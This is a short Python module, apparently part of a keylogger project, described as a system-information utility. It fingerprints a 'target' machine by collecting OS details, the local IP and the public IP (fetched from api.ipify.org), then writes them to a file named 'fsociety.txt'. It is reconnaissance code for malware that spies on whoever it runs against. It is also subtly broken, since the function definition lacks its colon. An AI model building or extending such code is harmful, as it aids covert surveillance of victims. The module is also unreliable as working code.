# system information utitlity for the key_logger
import platform
import socket
import requests

def sys_info()
	sys_os = platform.system()
	sys_arch = platform.machine()
	sys_release = platform.release()
	sys_version = platform.version()
	sys_uname = platform.uname()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	local_ip = s.getsockname()[0]
	r  = requests.get('https://api.ipify.org').text
	public_ip = r
	sys1 = f"[*] target_os = {sys_os}\n"
	sys2 = f"[*] target_os_arch = {sys_arch}\n"
	sys3 = f"[*] target_os_release = {sys_release}\n"
	sys4 = f"[*] target_os_version = {sys_version}\n"
	sys5 = f"[*] target_os_uname = {sys_uname}\n"
	sys6 = f"[*] target_local_ip = {local_ip}\n"
	sys7 = f"[*] target_public_ip = {public_ip}\n"
	with open('fsociety.txt', 'w') as p:
		p.write(sys1)
		p.write(sys2)
		p.write(sys3)
		p.write(sys4)
		p.write(sys5)
		p.write(sys6)
		p.write(sys7)
		p.close()
